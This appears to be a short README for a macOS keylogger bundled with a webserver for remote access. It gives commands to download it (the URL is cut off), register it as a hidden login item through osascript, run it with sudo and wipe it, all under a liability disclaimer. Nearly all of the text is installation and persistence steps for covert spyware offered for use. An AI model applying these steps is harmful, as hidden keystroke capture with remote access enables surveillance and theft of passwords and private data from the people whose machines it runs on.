# VeitchPack #
A keylogger bundled with a webserver. For remote access goodies on OSX... best done via ssh.
**I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSE BY THIS SOFTWARE. PROCEED TO USE AT YOUR OWN RISK. I WILL NOT BE HELD LIABLE.**
### Download ###
~~~~
curl -o "VeitchPack.zip" s
unzip VeitchPack.zip
~~~~

### Add to Startup Menu ###
~~~~
echo `pwd`/`ls launch.command`
osascript -e 'tell application "System Events" to make login item at end with properties {path:"PATH_HERE", hidden:true}'
~~~~

### Run ###
~~~~
sudo ./launch.command
~~~~

### Wipe ###
~~~~
sudo ./wipe.command
~~~~
